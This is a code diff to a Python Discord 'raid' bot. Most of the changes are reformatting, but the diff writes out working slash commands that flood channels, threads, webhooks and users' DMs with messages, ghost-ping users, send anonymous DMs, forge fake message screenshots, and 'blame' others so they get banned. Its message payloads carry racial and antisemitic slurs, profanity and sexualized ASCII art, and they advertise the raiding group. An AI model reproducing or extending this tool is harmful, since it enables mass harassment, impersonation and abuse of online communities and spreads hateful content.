 https://cdn.discordapp.com/attachments/1519702628576002211/1520137897272021012/9484cc52d8a8c0c699053fee2ff128e9.jpg?ex=6a401a3d&is=6a3ec8bd&hm=6a09885bf443349c198ae1adfafeb51d8d508e373406282ab0c74b7e11c442b7
 https://cdn.discordapp.com/attachments/1519702628576002211/1520138081595031602/4216e56198c3f2c4a180257dd622f4ac.jpg?ex=6a401a69&is=6a3ec8e9&hm=f556a7acd43bf380c70ac480de3bb1dd210f838718cbd686f70c9ca6fb6f10a9
-"""
-,
+""",
 
-"""
+            """
 https://cdn.discordapp.com/attachments/1519702628576002211/1520138183071891557/cecf20431609c2d834562df95a806213.jpg?ex=6a401a81&is=6a3ec901&hm=a8dde1c1a042bb17c4872ed745a636a33f12106e18852cd55d39398e0af81495
 https://cdn.discordapp.com/attachments/1519702628576002211/1520138227606880436/9d8316d5c613601e0b1784192cdc1e73.jpg?ex=6a401a8c&is=6a3ec90c&hm=8951936d4004c2da92dcf5970d5a56218b521e55c1248975af8f78423095e53f
 https://cdn.discordapp.com/attachments/1519702628576002211/1520138815019290644/585eb3fca837f84afb90569aeda1edd4.jpg?ex=6a401b18&is=6a3ec998&hm=7fa70ff11eb8b62ee94bf05422c9e1dbdd6fb21b5e7fc541b9b21caf6223ee28
 https://cdn.discordapp.com/attachments/1519702628576002211/1520138894140768388/be4f89465777e57ea32898481fe97748.jpg?ex=6a401b2b&is=6a3ec9ab&hm=65176235c5710ff8c269055c51e147b9335d9c952387c781d598a8cdd12f7de2
-"""
-,            
-    """
+""",
+            """
 # YOUR SERVES HAS BEEN FUCKED BY [CYBER ](https://tenor.com/view/mooning-show-butt-shake-butt-pants-down-gif-17077775)
 # RAID ANY SERVER WITHOUT NEEDING ANY ADMIN PERMS LOL
-# FREE AND VERY EASY TO USE IF U HAVE A FUCKING BRAIN 
+# FREE AND VERY EASY TO USE IF U HAVE A FUCKING BRAIN
 # GET A CHANCE TO HOST IT URSELF AT, ALL CODES ARE OPEN SOURCE
 # GIVE ME A FOLLOW IF YOU CAN AT [MY GITHUB](https://github.com/xenostopic-cyber)
 # "IF YOU CANT BEAT THEM, [JOIN](https://discord.com/invite/D7mZrGBsRj) THEM! @everyone"
 ⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀                            [JOIN CYBER, RAID ANY SERVER YOU WANT, HOST IT URSELF, BE A SKID AND NOT A JEW](https://discord.com/invite/D7mZrGBsRj)
- 
+
 [穹忩犈垃箚泗趨菋纳攇幀驼懅七](https://cdn.discordapp.com/attachments/1153733814732992573/1166450104350290020/d480327590432d30f979d4ce46baea6b.gif?ex=686e1290&is=686cc110&hm=312bf638b772621b7e9f33ac2f62832c5d417a7dbd08a307d5ae94e96cc9d8d1&)
     """,
-    """
-# [CYBER](https://discord.com/invite/D7mZrGBsRj) OWNS ME AND ALL :zany_face: 
+            """
+# [CYBER](https://discord.com/invite/D7mZrGBsRj) OWNS ME AND ALL :zany_face:
 # LOLLLLLLLLLLLL RAIDED U BRAINDEAD STUPID SCAMMERS :rofl: :rofl: :rofl:
 # IMAGINE U CANT SETUP A SERVER LMAOOOO
 # ALL HAIL [JOIN](https://discord.com/invite/D7mZrGBsRj) CYBER AND KEEP IN MIND CYBER DOMINATES EVERYONE
@@ -1063,7 +1767,7 @@ https://tenor.com/view/cat-hacking-silly-cat-hacker-cat-hacker-gif-1485244536247
 [穹忩犈垃箚泗趨菋纳攇幀驼懅七](https://cdn.discordapp.com/attachments/1153733814732992573/1166450104350290020/d480327590432d30f979d4ce46baea6b.gif?ex=686e1290&is=686cc110&hm=312bf638b772621b7e9f33ac2f62832c5d417a7dbd08a307d5ae94e96cc9d8d1&)
 @everyone
     """,
-    """
+            """
 # [CYBER](https://tenor.com/view/flashbang-guy-screaming-guy-getting-flashbang-blinded-blinding-gif-1425127881206275521) ON TOP BABYYYYYYYYYYY
 # GET __RAIDED NIGGA__, YOU DUMBASS FUCKFACES CAN'T HANDLE THIS SHIT LOLLL
 # [WE ALL KNOW HOW MUCH OF A RETARD YOU ARE](https://gg.cybernova.site.je)
@@ -1071,7 +1775,7 @@ https://tenor.com/view/cat-hacking-silly-cat-hacker-cat-hacker-gif-1485244536247
 # OR VISIT MY PROFILE, CLICK [HERE](https://gg.cybernova.site.je) AND MESSAGE ME FOR MORE INFO
 @everyone
     """
-]
+            ]
 
 BLANKFLOOD = ["""
 ‌
@@ -3159,30 +3863,30 @@ ASCII = [
     r"""
 ```
 
-  /$$$$$$  /$$     /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
+  /$$$$$$  /$$     /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$
  /$$__  $$|  $$   /$$/| $$__  $$| $$_____/| $$__  $$
 | $$  \__/ \  $$ /$$/ | $$  \ $$| $$      | $$  \ $$
 | $$        \  $$$$/  | $$$$$$$ | $$$$$   | $$$$$$$/
 | $$         \  $$/   | $$__  $$| $$__/   | $$__  $$
 | $$    $$    | $$    | $$  \ $$| $$      | $$  \ $$
 |  $$$$$$/    | $$    | $$$$$$$/| $$$$$$$$| $$  | $$
- \______/     |__/    |_______/ |________/|__/  |__/   
-                                                          
+ \______/     |__/    |_______/ |________/|__/  |__/
+
 ```
 ***BETTER [JOIN](https://discord.com/invite/D7mZrGBsRj) CYBER AND START RAIDING***
 [CYBER ON TOP](https://tenor.com/view/shawn-breezy-gamma-male-gif-13452613280176262444)
 @everyone
 
-    
+
     """,
     r"""
 ```
- ._____.__.___.__________ __________________ 
+ ._____.__.___.__________ __________________
  |__  |__\_ |__\_   ___ \\______   \_   ___ \
   /   |  || __ \|    \  \/|    |  _/    \  \/
  /    ^   / \_\ \     \___|    |   \     \____
  \____   ||___  /\______  /______  /\______  /
-      |__|    \/        \/       \/        \/ 
+      |__|    \/        \/       \/        \/
 ```
 ***[JOIN](https://discord.com/invite/D7mZrGBsRj) CYBER AND START RAIDING TODAY***
 ***[FREE](https://gg.cybernova.site.je/) TO USE, NO PERMS NEEDED***
@@ -3191,12 +3895,12 @@ ASCII = [
     """,
     r"""
 ```diff
--██████╗██╗   ██╗██████╗ ███████╗██████╗     
--██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    
--██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    
--██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    
--╚██████╗   ██║   ██████╔╝███████╗██║  ██║    
-- ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝                                                            
+-██████╗██╗   ██╗██████╗ ███████╗██████╗
+-██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗
+-██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝
+-██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗
+-╚██████╗   ██║   ██████╔╝███████╗██║  ██║
+- ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝
 ```
 ***[JOIN](https://discord.com/invite/D7mZrGBsRj) CYBER AND START RAIDING TODAY***
 ***[FREE](https://tenor.com/view/discord-discordgifemoji-red-blink-gif-13138334) TO USE, NO PERMS NEEDED***
@@ -3254,13 +3958,12 @@ HENTAI = [
 ⠄⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢛⣵⠇⡇⣿⣿⣿⢟⣵⢸⣿⡇
 ⣼⣿⣭⣶⣶⣶⣶⣝⡻⣿⣿⡿⠿⡛⠁⠄⠁⠄⠄⠄⠄⠄⠄⣵⣿⣿⠟
 ⠹⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣴⡸⣿⣧⣀⡤⣤⠄⠄⠄⠄⠄⢷⢰⠞⠄
-    
+
 # J-J-J-JOIN C-C-[CYBER](https://66.media.tumblr.com/43763839ac3e228314a43a0ffcced591/tumblr_p3jog4Xk5g1x09foko1_400.gif) x3 A-A-A-AND S-S-STAWT W-W-WAIDING :3 T-T-T-TODAY
 # NYO P-P-P-PEWMS uwU N-N-NYEEDED, (U ﹏ U) F-F-F-FWEE T-T-TO U-U-U-USE [(⑅˘꒳˘)](https://discord.com/invite/D7mZrGBsRj)
 @everyone
     """
 ]
-
 
 
 UNICODE_CHARS = (
@@ -3293,7 +3996,10 @@ class BspamButton(discord.ui.View):
         self.delay = delay
 
     @discord.ui.button(label="🚨 Spam Button", style=discord.ButtonStyle.danger)
-    async def start_spam(self, interaction: discord.Interaction, button: discord.ui.Button):
+    async def start_spam(
+            self,
+            interaction: discord.Interaction,
+            button: discord.ui.Button):
         await interaction.response.defer()
 
         allowed = discord.AllowedMentions(
@@ -3311,6 +4017,7 @@ class BspamButton(discord.ui.View):
                 await asyncio.sleep(self.delay)
             except discord.HTTPException:
                 break
+
 
 @bot.tree.command(
     name="spam",
@@ -3393,7 +4100,7 @@ async def bspam(
             spam_list = [
                 base * repeats
                 for _ in range(amount)
-            ]    
+            ]
 
         else:
             await interaction.response.send_message(
@@ -3435,7 +4142,8 @@ async def style_autocomplete(interaction: discord.Interaction, current: str):
         for s in styles
         if current.lower() in s.lower()
     ]
-    
+
+
 @bot.tree.command(name="raid", description="RAID Any Server.")
 @app_commands.describe(delay="Delay between messages in seconds (0.01 to 5.00).")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@@ -3446,7 +4154,8 @@ async def araid(interaction: discord.Interaction, delay: float = 0.01):
         return
 
     # Handled the indentation block so it stays clean inside the function
-    # Adjusted multiplier to 25 lines to fit safely within Discord's formatting limits
+    # Adjusted multiplier to 25 lines to fit safely within Discord's
+    # formatting limits
     raid_message = (
         "# ***[FUCKED BY CYBER](https://gg.cybernova.site.je)***\n"
         "# ***[FUCKED BY CYBER](https://gg.cybernova.site.je)***\n"
@@ -3478,11 +4187,12 @@ async def araid(interaction: discord.Interaction, delay: float = 0.01):
     try:
         view = FloodButton(raid_message, delay)
         await interaction.response.send_message("Press the button to start raiding.", view=view, ephemeral=True)
-    except discord.HTTPException as e:  
+    except discord.HTTPException as e:
         if e.code == 40094:  # follow-up message limit reached
-            print(f"[RAID ERROR] Max follow-up messages reached for interaction {interaction.id}")
+            print(
+                f"[RAID ERROR] Max follow-up messages reached for interaction {interaction.id}")
         else:
-            print(f"[RAID ERROR] Unexpected HTTPException: {e}")  
+            print(f"[RAID ERROR] Unexpected HTTPException: {e}")
             raise
 
     await log_command_use(
@@ -3491,6 +4201,7 @@ async def araid(interaction: discord.Interaction, delay: float = 0.01):
         channel=interaction.channel
     )
     update_leaderboard(interaction.user.id, "raid")
+
 
 @bot.tree.command(
     name="threadspam",
@@ -3527,12 +4238,12 @@ async def threadspammer(
         amount = 25
     if amount < 1:
         amount = 1
-    
+
     # Get the user ID from ctx if userid param is not provided correctly
     userId = ctx.user.id
-    
+
     dihcord = f"https://discord.com/api/v10/channels/{channelid}/threads"
-    
+
     payload = {
         "name": message,
         "type": 11,  # public thread
@@ -3560,7 +4271,8 @@ async def threadspammer(
             try:
                 async with session.post(dihcord, headers=headers, json=payload) as resp:
                     if resp.status == 403:
-                        print(f"[{userId} - /threadspam ] Missing Permissions (403)")
+                        print(
+                            f"[{userId} - /threadspam ] Missing Permissions (403)")
                         await ctx.followup.send(f"[{userId} - /threadspam ] Missing Permissions (403)")
                         break
                     if resp.status == 400:
@@ -3578,9 +4290,10 @@ async def threadspammer(
 
             if i < amount - 1:
                 await asyncio.sleep(delay / 1000)
-    
+
     await ctx.followup.send(f"Done spamming {amount} threads!")
-    
+
+
 @bot.tree.command(name="webhookspam", description="Spam a webhook")
 @app_commands.describe(
     webhook_url="The Discord webhook URL",
@@ -3592,15 +4305,17 @@ async def threadspammer(
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
 async def webhookspam(
-    interaction: discord.Interaction, 
-    webhook_url: str, 
-    msg: str, 
-    amount: int = 1, 
-    name: str = "Xenostopic", 
+    interaction: discord.Interaction,
+    webhook_url: str,
+    msg: str,
+    amount: int = 1,
+    name: str = "Xenostopic",
     pfp_image_link: str = None
 ):
-    if amount < 1: amount = 1
-    if amount > 999: amount = 999
+    if amount < 1:
+        amount = 1
+    if amount > 999:
+        amount = 999
     if not re.match(r'^https://discord\.com/api/webhooks/', webhook_url):
         await interaction.response.send_message("invalid webhook url", ephemeral=True)
         return
@@ -3617,14 +4332,15 @@ async def webhookspam(
         for _ in range(amount):
             try:
                 async with session.post(webhook_url, json=payload) as resp:
-                    if resp.status == 429: # Hit a rate limit
+                    if resp.status == 429:  # Hit a rate limit
                         retry_after = (await resp.json()).get("retry_after", 1)
                         await asyncio.sleep(retry_after)
             except Exception as err:
                 print(f"[/webhookspam] error: {err}")
 
-         
-@bot.tree.command(name="say", description="Make the bot say something you want, anonymously.")
+
+@bot.tree.command(name="say",
+                  description="Make the bot say something you want, anonymously.")
 @app_commands.describe(message="The message you want the bot to say.")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
@@ -3651,11 +4367,9 @@ async def say(interaction: discord.Interaction, message: str):
     name="ghostping",
     description="GhostPing Somebody multiple times! The best delay is 0.3 seconds"
 )
-@app_commands.describe(
-    user="📔 The user you want to ghost ping",
-    seconds="🕰️ The delay (in seconds) before each message is deleted. Best is 0.3 🕰️",
-    times="🔁 How many times to ghost ping them 🔁"
-)
+@app_commands.describe(user="📔 The user you want to ghost ping",
+                       seconds="🕰️ The delay (in seconds) before each message is deleted. Best is 0.3 🕰️",
+                       times="🔁 How many times to ghost ping them 🔁")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
 async def ghostping(
@@ -3674,25 +4388,30 @@ async def ghostping(
             await asyncio.sleep(seconds)
             await message.delete()
         except discord.HTTPException as e:
-            if e.code == 40094:  
-                print(f"[ghostping] follow up messages reached – stopped after {i} pings.")
+            if e.code == 40094:
+                print(
+                    f"[ghostping] follow up messages reached – stopped after {i} pings.")
                 break
             else:
                 raise
 
 whitelist = config.get("whitelist", [])
 
-@bot.tree.command(name="x-add-premium", description="Grant premium access to a user. (owner only)")
+
+@bot.tree.command(name="x-add-premium",
+                  description="Grant premium access to a user. (owner only)")
 @app_commands.describe(user="The user to grant premium access to")
 async def add_premium(interaction: discord.Interaction, user: discord.User):
     if interaction.user.id not in whitelist:
         await interaction.response.send_message("❌ You don't have permission to use this command.", ephemeral=True)
         return
-    
+
     add_premium_user(user.id)
     await interaction.response.send_message(f"✅ {user.mention} has been granted premium access!", ephemeral=False)
 
-@bot.tree.command(name="x-rem-premium", description="Remove premium access from a user. (owner only)")
+
+@bot.tree.command(name="x-rem-premium",
+                  description="Remove premium access from a user. (owner only)")
 @app_commands.describe(user="The user to remove premium access from")
 async def rem_premium(interaction: discord.Interaction, user: discord.User):
     if interaction.user.id not in whitelist:
@@ -3706,7 +4425,6 @@ async def rem_premium(interaction: discord.Interaction, user: discord.User):
         await interaction.response.send_message(f"⚠️ User {user.mention} does not have premium access.", ephemeral=True)
 
 
-
 class RoastButton(discord.ui.View):
     def __init__(self, user: discord.User, delay: float = 0.5):
         super().__init__()
@@ -3714,7 +4432,10 @@ class RoastButton(discord.ui.View):
         self.delay = delay
 
     @discord.ui.button(label="⚡ Send Roast", style=discord.ButtonStyle.blurple)
-    async def roast_button(self, interaction: discord.Interaction, button: discord.ui.Button):
+    async def roast_button(
+            self,
+            interaction: discord.Interaction,
+            button: discord.ui.Button):
         await interaction.response.defer()
         max_retries = 2
 
@@ -3733,7 +4454,8 @@ class RoastButton(discord.ui.View):
             retries = 0
             while retries <= max_retries:
                 try:
-                    allowed = discord.AllowedMentions(everyone=True, users=True, roles=True)
+                    allowed = discord.AllowedMentions(
+                        everyone=True, users=True, roles=True)
                     await interaction.followup.send(f"{roast_text} {self.user.mention}", allowed_mentions=allowed)
                     await asyncio.sleep(self.delay + random.uniform(0.1, 0.5))
                     break
@@ -3741,7 +4463,10 @@ class RoastButton(discord.ui.View):
                     if e.status == 429:
                         retry_after = getattr(e, "retry_after", 1.5)
                         retry_after = min(retry_after, 5)
-                        print(f"Rate limit hit, retrying after {retry_after:.2f}s (retry {retries + 1}/{max_retries})")
+                        print(
+                            f"Rate limit hit, retrying after {
+                                retry_after:.2f}s (retry {
+                                retries + 1}/{max_retries})")
                         await asyncio.sleep(retry_after)
                         retries += 1
                     else:
@@ -3750,13 +4475,13 @@ class RoastButton(discord.ui.View):
                 print("Failed to send roast after max retries, skipping.")
 
 
-@bot.tree.command(name="roast", description="Send a random roast to a user via button.")
+@bot.tree.command(name="roast",
+                  description="Send a random roast to a user via button.")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.describe(user="The user to roast")
 async def roast(interaction: discord.Interaction, user: discord.User):
     view = RoastButton(user, delay=0.5)
     await interaction.response.send_message("Press the button to send roasts! (5 per click)", view=view, ephemeral=True)
-
 
 
 def random_time_today():
@@ -3765,10 +4490,18 @@ def random_time_today():
     random_time = base_date + timedelta(minutes=random_minutes)
     return random_time
 
-@bot.tree.command(name="spoof-message", description="Send a realistic fake message as image.")
-@app_commands.describe(username="Name to display", message="Fake message to show", avatar_url="Avatar image URL")
+
+@bot.tree.command(name="spoof-message",
+                  description="Send a realistic fake message as image.")
+@app_commands.describe(username="Name to display",
+                       message="Fake message to show",
+                       avatar_url="Avatar image URL")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
-async def spoof_image(interaction: discord.Interaction, username: str, message: str, avatar_url: str = None):
+async def spoof_image(
+        interaction: discord.Interaction,
+        username: str,
+        message: str,
+        avatar_url: str = None):
     await interaction.response.send_message("🕵️ Spoofing message...", ephemeral=True)
 
     if not avatar_url:
@@ -3793,10 +4526,12 @@ async def spoof_image(interaction: discord.Interaction, username: str, message: 
     font_timestamp = ImageFont.truetype("arial.ttf", 12)
 
     img.paste(avatar, (20, 20), avatar)
-    now = random_time_today().strftime("Today at %I:%M %p").lstrip("0").replace(" 0", " ")
+    now = random_time_today().strftime(
+        "Today at %I:%M %p").lstrip("0").replace(" 0", " ")
 
     draw.text((70, 18), username, font=font_bold, fill=(255, 255, 255))
-    draw.text((70 + draw.textlength(username, font=font_bold) + 10, 21), now, font=font_timestamp, fill=(153, 170, 181))
+    draw.text((70 + draw.textlength(username, font=font_bold) + 10,
+              21), now, font=font_timestamp, fill=(153, 170, 181))
     draw.text((70, 45), message, font=font_regular, fill=(220, 221, 222))
 
     buffer = BytesIO()
@@ -3810,8 +4545,8 @@ async def spoof_image(interaction: discord.Interaction, username: str, message: 
     update_leaderboard(interaction.user.id, "spoof-message")
 
 
-
-@bot.tree.command(name="blame", description="Blame somebody else for raiding, and get them banned!")
+@bot.tree.command(name="blame",
+                  description="Blame somebody else for raiding, and get them banned!")
 @app_commands.describe(user="📰 The user you want to blame..")
 async def blame(interaction: discord.Interaction, user: discord.User):
     await interaction.response.send_message("Blaming... ✏️", ephemeral=True)
@@ -3819,12 +4554,16 @@ async def blame(interaction: discord.Interaction, user: discord.User):
     await log_command_use(interaction.user, "blame")
 
 
-
-@bot.tree.command(name="anon-dm", description="Anonymously DM someone with a message.")
-@app_commands.describe(user="The user you want to DM", message="The message to send")
+@bot.tree.command(name="anon-dm",
+                  description="Anonymously DM someone with a message.")
+@app_commands.describe(user="The user you want to DM",
+                       message="The message to send")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
-async def anon_dm(interaction: discord.Interaction, user: discord.User, message: str):
+async def anon_dm(
+        interaction: discord.Interaction,
+        user: discord.User,
+        message: str):
     try:
         await user.send(f"{message}")
         await interaction.response.send_message("Message sent anonymously ✅", ephemeral=True)
@@ -3838,14 +4577,23 @@ async def anon_dm(interaction: discord.Interaction, user: discord.User, message:
     )
 
 
-@bot.tree.command(name="flooduser", description="[💎] Flood a user's DMs with messages. (premium only!)")
-@app_commands.describe(user="The user to DM spam", message="Message to spam", times="How many times to send", delay="Delay between messages (in sec)")
+@bot.tree.command(name="flooduser",
+                  description="[💎] Flood a user's DMs with messages. (premium only!)")
+@app_commands.describe(user="The user to DM spam",
+                       message="Message to spam",
+                       times="How many times to send",
+                       delay="Delay between messages (in sec)")
 @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
 @app_commands.user_install()
-async def flooduser(interaction: discord.Interaction, user: discord.User, message: str, times: int = 5, delay: float = 0.3):
+async def flooduser(
+        interaction: discord.Interaction,
+        user: discord.User,
+        message: str,
+        times: int = 5,
+        delay: float = 0.3):
     if not is_premium_user(interaction.user.id):
-     await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
-     return
+        await interaction.response.send_message("💎 This command is only available for premium users.", ephemeral=True)
+        return
     await interaction.response.send_message("Flooding user... 💣", ephemeral=True)
     await log_command_use(
         user=interaction.user,
@@ -3862,14 +4610,27 @@ async def flooduser(interaction: discord.Interaction, user: discord.User, messag
             break
 
 
-
 @bot.event
 async def on_ready():
     print(logo)
-    print(f"{Fore.MAGENTA}>{Fore.WHITE} Logged in as {Fore.MAGENTA}{bot.user}{Fore.WHITE}.")
+    print(
+        f"{
+            Fore.MAGENTA}>{
+            Fore.WHITE} Logged in as {
+                Fore.MAGENTA}{
+                    bot.user}{
+                        Fore.WHITE}.")
     try:
         synced = await bot.tree.sync()
-        print(f"{Fore.MAGENTA}>{Fore.WHITE} Synced {Fore.MAGENTA}{len(synced)} {Fore.WHITE}commands{Fore.MAGENTA}.{Fore.WHITE}")
+        print(
+            f"{
+                Fore.MAGENTA}>{
+                Fore.WHITE} Synced {
+                Fore.MAGENTA}{
+                    len(synced)} {
+                        Fore.WHITE}commands{
+                            Fore.MAGENTA}.{
+                                Fore.WHITE}")
     except Exception as e:
         print(f"Failed to sync commands: {e}")
 
@@ -3882,14 +4643,14 @@ if __name__ == "__main__":
         except discord.errors.LoginFailure:
             print(Fore.RED + "Can't connect to token. Please check your token.")
             input(Fore.YELLOW + "Press Enter to go back to the menu...")
-            TOKEN = token_management()  
+            TOKEN = token_management()
             if TOKEN:
-                bot.run(TOKEN)  
+                bot.run(TOKEN)
         except Exception as e:
             print(Fore.RED + f"An unexpected error occurred: {e}")
             input(Fore.YELLOW + "Press Enter to restart the menu...")
-            TOKEN = token_management() 
+            TOKEN = token_management()
             if TOKEN:
-                bot.run(TOKEN)  
+                bot.run(TOKEN)
     else:
         print(Fore.RED + "❌ Error: Unable to load or set a token.")
